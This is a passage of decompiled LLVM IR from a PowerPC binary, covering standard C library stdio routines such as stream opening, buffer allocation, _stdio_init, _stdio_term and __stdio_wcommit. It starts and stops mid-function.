  store i32 0, i32* %v3_1000b560, align 4
  store i32 268481896, i32* @lr, align 4
  %v0_1000b564 = call i32 @__stdio_init_mutex()
  %v0_1000b568.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b568

dec_label_pc_1000b568:                            ; preds = %dec_label_pc_1000b538, %dec_label_pc_1000b550
  %v0_1000b5c8 = phi i32 [ %v0_1000b4b8, %dec_label_pc_1000b538 ], [ %v0_1000b568.pre, %dec_label_pc_1000b550 ]
  %v1_1000b568 = icmp slt i32 %v0_1000b5c8, 0
  br i1 %v1_1000b568, label %dec_label_pc_1000b5c8, label %dec_label_pc_1000b570

dec_label_pc_1000b570:                            ; preds = %dec_label_pc_1000b568
  %v1_1000b574 = add i32 %arg1, 1
  store i32 %v1_1000b574, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1000b57c = load i32, i32* @r31, align 4
  %v2_1000b57c = add i32 %v1_1000b57c, 4
  %v3_1000b57c = inttoptr i32 %v2_1000b57c to i32*
  store i32 %v0_1000b5c8, i32* %v3_1000b57c, align 4
  %v0_1000b580 = load i32, i32* @r28, align 4
  %v1_1000b580 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b580 = and i32 %v1_1000b580, %v0_1000b580
  %v1_1000b584 = add i32 %v2_1000b580, 1
  store i32 %v1_1000b584, i32* %r9.global-to-local, align 4
  %v1_1000b588 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b588 = and i32 %v1_1000b588, %v1_1000b584
  store i32 %v2_1000b588, i32* %r0.global-to-local, align 4
  %v4_1000b58c = icmp eq i32 %v2_1000b588, %v1_1000b584
  br i1 %v4_1000b58c, label %dec_label_pc_1000b594, label %dec_label_pc_1000b4e0

dec_label_pc_1000b594:                            ; preds = %dec_label_pc_1000b570
  %v2_1000b594 = sub i32 -1, %arg1
  %v3_1000b594 = and i32 %v0_1000b580, %v2_1000b594
  store i32 %v3_1000b594, i32* %r0.global-to-local, align 4
  %v1_1000b598 = and i32 %v3_1000b594, 1024
  store i32 %v1_1000b598, i32* %r9.global-to-local, align 4
  %v3_1000b598 = icmp eq i32 %v1_1000b598, 0
  store i1 %v3_1000b598, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b598, label %dec_label_pc_1000b5bc, label %dec_label_pc_1000b5a0

dec_label_pc_1000b5a0:                            ; preds = %dec_label_pc_1000b594
  %v0_1000b5a0 = load i32, i32* @r29, align 4
  store i32 268481972, i32* @lr, align 4
  %v2_1000b5b0 = call i32 @__libc_fcntl(i32 %v0_1000b5a0, i32 4)
  %v3_1000b5b4 = icmp eq i32 %v2_1000b5b0, 0
  br i1 %v3_1000b5b4, label %dec_label_pc_1000b5bc, label %dec_label_pc_1000b4e0

dec_label_pc_1000b5bc:                            ; preds = %dec_label_pc_1000b5a0, %dec_label_pc_1000b594
  %v1_1000b5bc = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1000b5bc, i32* %r0.global-to-local, align 4
  %v0_1000b5c0 = load i32, i32* @r28, align 4
  %v2_1000b5c0 = or i32 %v0_1000b5c0, %v1_1000b5bc
  store i32 %v2_1000b5c0, i32* @r28, align 4
  br label %dec_label_pc_1000b5f4

dec_label_pc_1000b5c8:                            ; preds = %dec_label_pc_1000b568
  %v3_1000b5c8 = icmp eq i32 %v0_1000b5c8, -1
  %v0_1000b5d8.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000b5c8, label %dec_label_pc_1000b5d4, label %dec_label_pc_1000b5d0

dec_label_pc_1000b5d0:                            ; preds = %dec_label_pc_1000b5c8
  %v1_1000b5d0 = or i32 %v0_1000b5d8.pre, 65536
  store i32 %v1_1000b5d0, i32* @r28, align 4
  br label %dec_label_pc_1000b5d4

dec_label_pc_1000b5d4:                            ; preds = %dec_label_pc_1000b5c8, %dec_label_pc_1000b5d0
  %v0_1000b5d8 = phi i32 [ %v1_1000b5d0, %dec_label_pc_1000b5d0 ], [ %v0_1000b5d8.pre, %dec_label_pc_1000b5c8 ]
  store i32 %v0_1000b5d8, i32* @r4, align 4
  store i32 438, i32* @r5, align 4
  store i32 268482024, i32* @lr, align 4
  %v0_1000b5e4 = call i32 @__libc_open()
  %v1_1000b5e8 = icmp slt i32 %v0_1000b5e4, 0
  %v1_1000b5ec = load i32, i32* @r31, align 4
  %v2_1000b5ec = add i32 %v1_1000b5ec, 4
  %v3_1000b5ec = inttoptr i32 %v2_1000b5ec to i32*
  store i32 %v0_1000b5e4, i32* %v3_1000b5ec, align 4
  br i1 %v1_1000b5e8, label %dec_label_pc_1000b4f4, label %dec_label_pc_1000b5d4.dec_label_pc_1000b5f4_crit_edge

dec_label_pc_1000b5d4.dec_label_pc_1000b5f4_crit_edge: ; preds = %dec_label_pc_1000b5d4
  %v0_1000b5f8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000b5f4

dec_label_pc_1000b5f4:                            ; preds = %dec_label_pc_1000b5d4.dec_label_pc_1000b5f4_crit_edge, %dec_label_pc_1000b5bc
  %v0_1000b5f8 = phi i32 [ %v0_1000b5f8.pre, %dec_label_pc_1000b5d4.dec_label_pc_1000b5f4_crit_edge ], [ %v2_1000b5c0, %dec_label_pc_1000b5bc ]
  %v0_1000b5f4 = load i32, i32* @r31, align 4
  %v1_1000b5f4 = inttoptr i32 %v0_1000b5f4 to i16*
  %v2_1000b5f4 = load i16, i16* %v1_1000b5f4, align 2
  %v3_1000b5f4 = zext i16 %v2_1000b5f4 to i32
  store i32 %v3_1000b5f4, i32* %r0.global-to-local, align 4
  %v1_1000b5f8 = urem i32 %v0_1000b5f8, 4
  store i32 %v1_1000b5f8, i32* %r29.global-to-local, align 4
  %v1_1000b5fc = call i32 @__asm_rlwinm(i32 %v0_1000b5f8, i32 0, i32 21, i32 21)
  %v1_1000b600 = add nuw nsw i32 %v1_1000b5f8, 1
  store i32 %v1_1000b600, i32* %r29.global-to-local, align 4
  %v1_1000b604 = call i32 @__asm_rlwinm(i32 %v3_1000b5f4, i32 0, i32 18, i32 18)
  store i32 %v1_1000b604, i32* %r0.global-to-local, align 4
  %v1_1000b608 = xor i32 %v1_1000b600, 3
  store i32 %v1_1000b608, i32* %r29.global-to-local, align 4
  %v1_1000b60c = urem i32 %v1_1000b604, 65536
  store i32 %v1_1000b60c, i32* %r9.global-to-local, align 4
  %v0_1000b610 = load i32, i32* @r28, align 4
  %v1_1000b610 = call i32 @__asm_rlwinm(i32 %v0_1000b610, i32 31, i32 16, i32 16)
  %v2_1000b614 = or i32 %v1_1000b610, %v1_1000b5fc
  store i32 %v2_1000b614, i32* %r0.global-to-local, align 4
  %v0_1000b618 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b618 = mul i32 %v0_1000b618, 16
  %v0_1000b61c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b61c = or i32 %v0_1000b61c, %v2_1000b614
  store i32 %v2_1000b61c, i32* %r9.global-to-local, align 4
  %v2_1000b620 = or i32 %v2_1000b61c, %v1_1000b618
  store i32 %v2_1000b620, i32* @r29, align 4
  %v1_1000b624 = trunc i32 %v2_1000b620 to i16
  %v2_1000b624 = load i32, i32* @r31, align 4
  %v3_1000b624 = inttoptr i32 %v2_1000b624 to i16*
  store i16 %v1_1000b624, i16* %v3_1000b624, align 2
  %v0_1000b628 = call i32 @__errno_location()
  store i32 %v0_1000b628, i32* @r28, align 4
  %v0_1000b630 = load i32, i32* @r31, align 4
  %v1_1000b630 = add i32 %v0_1000b630, 4
  %v2_1000b630 = inttoptr i32 %v1_1000b630 to i32*
  %v3_1000b630 = load i32, i32* %v2_1000b630, align 4
  %v1_1000b634 = inttoptr i32 %v0_1000b628 to i32*
  %v2_1000b634 = load i32, i32* %v1_1000b634, align 4
  store i32 %v2_1000b634, i32* @r27, align 4
  store i32 268482108, i32* @lr, align 4
  %v1_1000b638 = call i32 @isatty(i32 %v3_1000b630)
  %v1_1000b63c = mul i32 %v1_1000b638, 256
  %v0_1000b640 = load i32, i32* @r29, align 4
  %v2_1000b640 = or i32 %v0_1000b640, %v1_1000b63c
  store i32 %v2_1000b640, i32* @r29, align 4
  %v1_1000b644 = trunc i32 %v2_1000b640 to i16
  %v2_1000b644 = load i32, i32* @r31, align 4
  %v3_1000b644 = inttoptr i32 %v2_1000b644 to i16*
  store i16 %v1_1000b644, i16* %v3_1000b644, align 2
  %v0_1000b648 = load i32, i32* @r27, align 4
  %v1_1000b648 = load i32, i32* @r28, align 4
  %v2_1000b648 = inttoptr i32 %v1_1000b648 to i32*
  store i32 %v0_1000b648, i32* %v2_1000b648, align 4
  %v0_1000b64c = load i32, i32* @r31, align 4
  %v1_1000b64c = add i32 %v0_1000b64c, 8
  %v2_1000b64c = inttoptr i32 %v1_1000b64c to i32*
  %v3_1000b64c = load i32, i32* %v2_1000b64c, align 4
  store i32 %v3_1000b64c, i32* %r0.global-to-local, align 4
  %v3_1000b650 = icmp eq i32 %v3_1000b64c, 0
  br i1 %v3_1000b650, label %dec_label_pc_1000b658, label %dec_label_pc_1000b688

dec_label_pc_1000b658:                            ; preds = %dec_label_pc_1000b5f4
  store i32 4096, i32* @r3, align 4
  store i32 268482144, i32* @lr, align 4
  %v0_1000b65c = call i32 @malloc()
  %v3_1000b660 = icmp eq i32 %v0_1000b65c, 0
  %v1_1000b664 = load i32, i32* @r31, align 4
  %v2_1000b664 = add i32 %v1_1000b664, 8
  %v3_1000b664 = inttoptr i32 %v2_1000b664 to i32*
  store i32 %v0_1000b65c, i32* %v3_1000b664, align 4
  %v1_1000b684 = load i32, i32* @r31, align 4
  br i1 %v3_1000b660, label %dec_label_pc_1000b684, label %dec_label_pc_1000b66c

dec_label_pc_1000b66c:                            ; preds = %dec_label_pc_1000b658
  %v1_1000b66c = inttoptr i32 %v1_1000b684 to i16*
  %v2_1000b66c = load i16, i16* %v1_1000b66c, align 2
  %v3_1000b66c = zext i16 %v2_1000b66c to i32
  store i32 %v3_1000b66c, i32* %r0.global-to-local, align 4
  %v1_1000b670 = add i32 %v0_1000b65c, 4096
  store i32 %v1_1000b670, i32* %r9.global-to-local, align 4
  %v2_1000b674 = add i32 %v1_1000b684, 12
  %v3_1000b674 = inttoptr i32 %v2_1000b674 to i32*
  store i32 %v1_1000b670, i32* %v3_1000b674, align 4
  %v0_1000b678 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b678 = or i32 %v0_1000b678, 16384
  store i32 %v1_1000b678, i32* %r0.global-to-local, align 4
  %v1_1000b67c = trunc i32 %v1_1000b678 to i16
  %v2_1000b67c = load i32, i32* @r31, align 4
  %v3_1000b67c = inttoptr i32 %v2_1000b67c to i16*
  store i16 %v1_1000b67c, i16* %v3_1000b67c, align 2
  br label %dec_label_pc_1000b688

dec_label_pc_1000b684:                            ; preds = %dec_label_pc_1000b658
  %v2_1000b684 = add i32 %v1_1000b684, 12
  %v3_1000b684 = inttoptr i32 %v2_1000b684 to i32*
  store i32 0, i32* %v3_1000b684, align 4
  br label %dec_label_pc_1000b688

dec_label_pc_1000b688:                            ; preds = %dec_label_pc_1000b5f4, %dec_label_pc_1000b66c, %dec_label_pc_1000b684
  %v0_1000b688 = load i32, i32* @r31, align 4
  %v1_1000b688 = inttoptr i32 %v0_1000b688 to i16*
  %v2_1000b688 = load i16, i16* %v1_1000b688, align 2
  %v3_1000b688 = zext i16 %v2_1000b688 to i32
  store i32 %v3_1000b688, i32* %r0.global-to-local, align 4
  %v1_1000b68c = add i32 %v0_1000b688, 8
  %v2_1000b68c = inttoptr i32 %v1_1000b68c to i32*
  %v3_1000b68c = load i32, i32* %v2_1000b68c, align 4
  store i32 %v3_1000b68c, i32* %r9.global-to-local, align 4
  %v1_1000b690 = and i32 %v3_1000b688, 8192
  %v3_1000b690 = icmp eq i32 %v1_1000b690, 0
  store i1 %v3_1000b690, i1* %cr0_eq.global-to-local, align 1
  %v3_1000b698 = add i32 %v0_1000b688, 2
  %v4_1000b698 = inttoptr i32 %v3_1000b698 to i8*
  store i8 0, i8* %v4_1000b698, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000b6a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6a0 = load i32, i32* @r31, align 4
  %v2_1000b6a0 = add i32 %v1_1000b6a0, 20
  %v3_1000b6a0 = inttoptr i32 %v2_1000b6a0 to i32*
  store i32 %v0_1000b6a0, i32* %v3_1000b6a0, align 4
  %v0_1000b6a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6a4 = load i32, i32* @r31, align 4
  %v2_1000b6a4 = add i32 %v1_1000b6a4, 24
  %v3_1000b6a4 = inttoptr i32 %v2_1000b6a4 to i32*
  store i32 %v0_1000b6a4, i32* %v3_1000b6a4, align 4
  %v0_1000b6a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6a8 = load i32, i32* @r31, align 4
  %v2_1000b6a8 = add i32 %v1_1000b6a8, 28
  %v3_1000b6a8 = inttoptr i32 %v2_1000b6a8 to i32*
  store i32 %v0_1000b6a8, i32* %v3_1000b6a8, align 4
  %v0_1000b6ac = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6ac = load i32, i32* @r31, align 4
  %v2_1000b6ac = add i32 %v1_1000b6ac, 16
  %v3_1000b6ac = inttoptr i32 %v2_1000b6ac to i32*
  store i32 %v0_1000b6ac, i32* %v3_1000b6ac, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v0_1000b6b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b6b4 = load i32, i32* @r31, align 4
  %v2_1000b6b4 = add i32 %v1_1000b6b4, 44
  %v3_1000b6b4 = inttoptr i32 %v2_1000b6b4 to i32*
  store i32 %v0_1000b6b4, i32* %v3_1000b6b4, align 4
  %v3_1000b6b8 = load i32, i32* @global_var_1002ef9c.234, align 4
  store i32 %v3_1000b6b8, i32* %r0.global-to-local, align 4
  %v1_1000b6bc = load i32, i32* @r31, align 4
  %v2_1000b6bc = add i32 %v1_1000b6bc, 52
  %v3_1000b6bc = inttoptr i32 %v2_1000b6bc to i32*
  store i32 %v3_1000b6b8, i32* %v3_1000b6bc, align 4
  %v0_1000b6c0 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000b6c0, label %dec_label_pc_1000b744, label %dec_label_pc_1000b6c4

dec_label_pc_1000b6c4:                            ; preds = %dec_label_pc_1000b688
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b6d4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b6d4, i32* @r26, align 4
  %v4_1000b6e4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32))
  %v2_1000b6f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b6f0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1002ebe0.388 to i32), i32* @r29, align 4
  store i32 268482300, i32* @lr, align 4
  %v1_1000b6f8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32))
  %v0_1000b6fc = load i32, i32* @r28, align 4
  %v0_1000b700 = load i32, i32* @r29, align 4
  %v4_1000b708 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000b6fc, i32 %v0_1000b700)
  %v0_1000b70c = load i32, i32* @r29, align 4
  store i32 268482324, i32* @lr, align 4
  %v1_1000b710 = call i32 @pthread_mutex_lock(i32 %v0_1000b70c)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b718 = load i32, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  store i32 %v3_1000b718, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b6f0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000b724 = load i32, i32* @r31, align 4
  %v2_1000b724 = add i32 %v1_1000b724, 32
  %v3_1000b724 = inttoptr i32 %v2_1000b724 to i32*
  store i32 %v3_1000b718, i32* %v3_1000b724, align 4
  %v0_1000b728 = load i32, i32* @r31, align 4
  store i32 %v0_1000b728, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  store i32 268482352, i32* @lr, align 4
  %v0_1000b72c = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v2_1000b6d4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000b73c.389 to i32), i32* @lr, align 4
  %v0_1000b738 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000b744

dec_label_pc_1000b740:                            ; preds = %dec_label_pc_1000b4f4, %dec_label_pc_1000b4e0, %dec_label_pc_1000b500
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000b744

dec_label_pc_1000b744:                            ; preds = %dec_label_pc_1000b688, %dec_label_pc_1000b540, %dec_label_pc_1000b6c4, %dec_label_pc_1000b740
  store i32 %v0_1000b4a0, i32* %r0.global-to-local, align 4
  %v0_1000b748 = load i32, i32* @r31, align 4
  ret i32 %v0_1000b748

; uselistorder directives
  uselistorder i32 %v1_1000b684, { 2, 0, 1 }
  uselistorder i32 %v0_1000b5f8, { 1, 0 }
  uselistorder i32 %v0_1000b544, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000b530, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 1, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i8 114, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000b744, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b740, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b688, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b5d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b568, { 1, 0 }
  uselistorder label %dec_label_pc_1000b538, { 1, 0 }
  uselistorder label %dec_label_pc_1000b524, { 1, 0 }
  uselistorder label %dec_label_pc_1000b510, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r28, align 4
  %v0_1000b770 = call i32 @__errno_location()
  store i32 %v0_1000b770, i32* @r26, align 4
  %v1_1000b77c = inttoptr i32 %v0_1000b770 to i32*
  %v2_1000b77c = load i32, i32* %v1_1000b77c, align 4
  store i32 %v2_1000b77c, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1002ec10.232 to i32), i32* @r27, align 4
  %v3_1000b784 = load i16, i16* @global_var_1002ec10.232, align 2
  %v4_1000b784 = zext i16 %v3_1000b784 to i32
  store i32 %v4_1000b784, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b78c.390 to i32), i32* @lr, align 4
  %v1_1000b788 = call i32 @isatty(i32 0)
  %v1_1000b78c = sub i32 1, %v1_1000b788
  %v1_1000b790 = mul i32 %v1_1000b78c, 256
  %v0_1000b794 = load i32, i32* @r29, align 4
  %v2_1000b794 = xor i32 %v1_1000b790, %v0_1000b794
  %v1_1000b79c = trunc i32 %v2_1000b794 to i16
  store i16 %v1_1000b79c, i16* @global_var_1002ec10.232, align 2
  %v3_1000b7a0 = load i16, i16* @global_var_1002ec60.367, align 2
  %v4_1000b7a0 = zext i16 %v3_1000b7a0 to i32
  store i32 %v4_1000b7a0, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b7a8.391 to i32), i32* @lr, align 4
  %v1_1000b7a4 = call i32 @isatty(i32 1)
  %v1_1000b7a8 = sub i32 1, %v1_1000b7a4
  %v1_1000b7ac = mul i32 %v1_1000b7a8, 256
  %v0_1000b7b0 = load i32, i32* @r29, align 4
  %v2_1000b7b0 = xor i32 %v1_1000b7ac, %v0_1000b7b0
  %v1_1000b7b4 = trunc i32 %v2_1000b7b0 to i16
  store i16 %v1_1000b7b4, i16* @global_var_1002ec60.367, align 2
  %v0_1000b7b8 = load i32, i32* @r25, align 4
  %v1_1000b7b8 = load i32, i32* @r26, align 4
  %v2_1000b7b8 = inttoptr i32 %v1_1000b7b8 to i32*
  store i32 %v0_1000b7b8, i32* %v2_1000b7b8, align 4
  ret i32 %v1_1000b7ac

; uselistorder directives
  uselistorder i32 %v1_1000b7ac, { 1, 0 }
  uselistorder i16* @global_var_1002ec60.367, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10018c80.392 to i32), i32* @r4, align 4
  %v0_1000b7dc = call i32 @memcpy()
  ret i32 %v0_1000b7dc
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002ebe0.388 to i32), i32* @r3, align 4
  store i32 268482556, i32* @lr, align 4
  %v0_1000b7f8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32), i32* @r3, align 4
  store i32 268482568, i32* @lr, align 4
  %v0_1000b804 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  %v3_1000b8509 = icmp eq i32 %storemerge6, 0
  %v1_1000b85411 = add i32 %storemerge6, 56
  store i32 %v1_1000b85411, i32* @r30, align 4
  br i1 %v3_1000b8509, label %dec_label_pc_1000b860, label %dec_label_pc_1000b814

dec_label_pc_1000b814:                            ; preds = %entry, %dec_label_pc_1000b840
  %v0_1000b814 = phi i32 [ %v1_1000b854, %dec_label_pc_1000b840 ], [ %v1_1000b85411, %entry ]
  store i32 268482584, i32* @lr, align 4
  %v1_1000b814 = call i32 @pthread_mutex_trylock(i32 %v0_1000b814)
  %v3_1000b818 = icmp eq i32 %v1_1000b814, 0
  %v0_1000b81c = load i32, i32* @r30, align 4
  store i32 %v0_1000b81c, i32* @r3, align 4
  br i1 %v3_1000b818, label %dec_label_pc_1000b840, label %dec_label_pc_1000b824

dec_label_pc_1000b824:                            ; preds = %dec_label_pc_1000b814
  %v0_1000b824 = load i32, i32* @r31, align 4
  %v1_1000b824 = add i32 %v0_1000b824, 8
  %v2_1000b824 = inttoptr i32 %v1_1000b824 to i32*
  %v3_1000b824 = load i32, i32* %v2_1000b824, align 4
  store i32 %v3_1000b824, i32* %r9.global-to-local, align 4
  %v3_1000b82c = inttoptr i32 %v0_1000b824 to i16*
  store i16 48, i16* %v3_1000b82c, align 2
  %v0_1000b830 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b830 = load i32, i32* @r31, align 4
  %v2_1000b830 = add i32 %v1_1000b830, 20
  %v3_1000b830 = inttoptr i32 %v2_1000b830 to i32*
  store i32 %v0_1000b830, i32* %v3_1000b830, align 4
  %v0_1000b834 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b834 = load i32, i32* @r31, align 4
  %v2_1000b834 = add i32 %v1_1000b834, 24
  %v3_1000b834 = inttoptr i32 %v2_1000b834 to i32*
  store i32 %v0_1000b834, i32* %v3_1000b834, align 4
  %v0_1000b838 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b838 = load i32, i32* @r31, align 4
  %v2_1000b838 = add i32 %v1_1000b838, 28
  %v3_1000b838 = inttoptr i32 %v2_1000b838 to i32*
  store i32 %v0_1000b838, i32* %v3_1000b838, align 4
  %v0_1000b83c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b83c = load i32, i32* @r31, align 4
  %v2_1000b83c = add i32 %v1_1000b83c, 16
  %v3_1000b83c = inttoptr i32 %v2_1000b83c to i32*
  store i32 %v0_1000b83c, i32* %v3_1000b83c, align 4
  br label %dec_label_pc_1000b840

dec_label_pc_1000b840:                            ; preds = %dec_label_pc_1000b814, %dec_label_pc_1000b824
  %v1_1000b844 = load i32, i32* @r31, align 4
  %v2_1000b844 = add i32 %v1_1000b844, 52
  %v3_1000b844 = inttoptr i32 %v2_1000b844 to i32*
  store i32 1, i32* %v3_1000b844, align 4
  store i32 268482636, i32* @lr, align 4
  %v0_1000b848 = call i32 @__stdio_init_mutex()
  %v0_1000b84c = load i32, i32* @r31, align 4
  %v1_1000b84c = add i32 %v0_1000b84c, 32
  %v2_1000b84c = inttoptr i32 %v1_1000b84c to i32*
  %storemerge = load i32, i32* %v2_1000b84c, align 4
  %v3_1000b850 = icmp eq i32 %storemerge, 0
  %v1_1000b854 = add i32 %storemerge, 56
  store i32 %v1_1000b854, i32* @r30, align 4
  br i1 %v3_1000b850, label %dec_label_pc_1000b850.dec_label_pc_1000b860_crit_edge, label %dec_label_pc_1000b814

dec_label_pc_1000b850.dec_label_pc_1000b860_crit_edge: ; preds = %dec_label_pc_1000b840
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  br label %dec_label_pc_1000b860

dec_label_pc_1000b860:                            ; preds = %dec_label_pc_1000b850.dec_label_pc_1000b860_crit_edge, %entry
  %v0_1000b89c17 = phi i32 [ %v1_1000b854, %dec_label_pc_1000b850.dec_label_pc_1000b860_crit_edge ], [ %v1_1000b85411, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000b850.dec_label_pc_1000b860_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000b8845 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000b8845, label %dec_label_pc_1000b88c, label %dec_label_pc_1000b86c

dec_label_pc_1000b86c:                            ; preds = %dec_label_pc_1000b860, %dec_label_pc_1000b880
  %v0_1000b86c = phi i32 [ %storemerge1, %dec_label_pc_1000b880 ], [ %storemerge12, %dec_label_pc_1000b860 ]
  %v1_1000b86c = inttoptr i32 %v0_1000b86c to i16*
  %v2_1000b86c = load i16, i16* %v1_1000b86c, align 2
  %v3_1000b86c = zext i16 %v2_1000b86c to i32
  store i32 %v0_1000b86c, i32* @r3, align 4
  %v1_1000b874 = and i32 %v3_1000b86c, 64
  store i32 %v1_1000b874, i32* %r9.global-to-local, align 4
  %v3_1000b874 = icmp eq i32 %v1_1000b874, 0
  br i1 %v3_1000b874, label %dec_label_pc_1000b880, label %dec_label_pc_1000b87c

dec_label_pc_1000b87c:                            ; preds = %dec_label_pc_1000b86c
  store i32 268482688, i32* @lr, align 4
  %v0_1000b87c = call i32 @__stdio_wcommit()
  %v0_1000b880.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b880

dec_label_pc_1000b880:                            ; preds = %dec_label_pc_1000b86c, %dec_label_pc_1000b87c
  %v0_1000b880 = phi i32 [ %v0_1000b86c, %dec_label_pc_1000b86c ], [ %v0_1000b880.pre, %dec_label_pc_1000b87c ]
  %v0_1000b89c18 = phi i32 [ %v0_1000b86c, %dec_label_pc_1000b86c ], [ %v0_1000b87c, %dec_label_pc_1000b87c ]
  %v1_1000b880 = add i32 %v0_1000b880, 32
  %v2_1000b880 = inttoptr i32 %v1_1000b880 to i32*
  %storemerge1 = load i32, i32* %v2_1000b880, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000b884 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000b884, label %dec_label_pc_1000b88c, label %dec_label_pc_1000b86c

dec_label_pc_1000b88c:                            ; preds = %dec_label_pc_1000b880, %dec_label_pc_1000b860
  %v0_1000b89c = phi i32 [ %v0_1000b89c17, %dec_label_pc_1000b860 ], [ %v0_1000b89c18, %dec_label_pc_1000b880 ]
  ret i32 %v0_1000b89c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000b86c, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %v1_1000b854, { 0, 2, 1 }
  uselistorder i32 %v1_1000b85411, { 1, 0, 2 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1000b880, { 1, 0 }
  uselistorder label %dec_label_pc_1000b86c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b840, { 1, 0 }
  uselistorder label %dec_label_pc_1000b814, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000b8a8 = load i32, i32* @r31, align 4
  %v0_1000b8ac = load i32, i32* @r3, align 4
  %v1_1000b8b4 = add i32 %v0_1000b8ac, 8
  %v2_1000b8b4 = inttoptr i32 %v1_1000b8b4 to i32*
  %v3_1000b8b4 = load i32, i32* %v2_1000b8b4, align 4
  %v1_1000b8b8 = add i32 %v0_1000b8ac, 16
  %v2_1000b8b8 = inttoptr i32 %v1_1000b8b8 to i32*
  %v3_1000b8b8 = load i32, i32* %v2_1000b8b8, align 4
  %v2_1000b8c0 = sub i32 %v3_1000b8b8, %v3_1000b8b4
  store i32 %v2_1000b8c0, i32* @r5, align 4
  %v5_1000b8c0 = icmp eq i32 %v2_1000b8c0, 0
